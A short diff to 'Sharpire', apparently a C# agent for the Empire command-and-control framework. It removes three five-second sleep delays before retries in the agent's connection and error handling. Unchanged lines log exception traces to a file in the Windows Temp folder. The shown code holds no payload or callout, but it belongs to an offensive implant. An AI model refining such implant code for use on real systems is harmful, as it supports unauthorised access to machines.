@@ -196,7 +196,7 @@ namespace Sharpire
                     System.IO.File.AppendAllText("C:\\Windows\\Temp\\sharpire_debug.log",
                         $"[{DateTime.Now}] DotNetEmpire exception: {innerEx.Message}\n{innerEx.StackTrace}\n");
 
-                    Thread.Sleep(5000); // Wait before retry
+                    
                     Execute();
                 }
             }
@@ -208,7 +208,7 @@ namespace Sharpire
 
                 if (webError.Response != null && (int)((HttpWebResponse)webError.Response).StatusCode == 500)
                 {
-                    Thread.Sleep(5000); // Wait before retry
+                    
                     Execute();
                 }
                 else
@@ -507,7 +507,6 @@ namespace Sharpire
                 System.IO.File.AppendAllText("C:\\Windows\\Temp\\sharpire_debug.log",
                     $"[{DateTime.Now}] DotNetEmpire exception: {ex.Message}\n{ex.StackTrace}\n");
 
-                Thread.Sleep(5000); // Wait before retry
                 DotNetEmpire();
             }
             finally
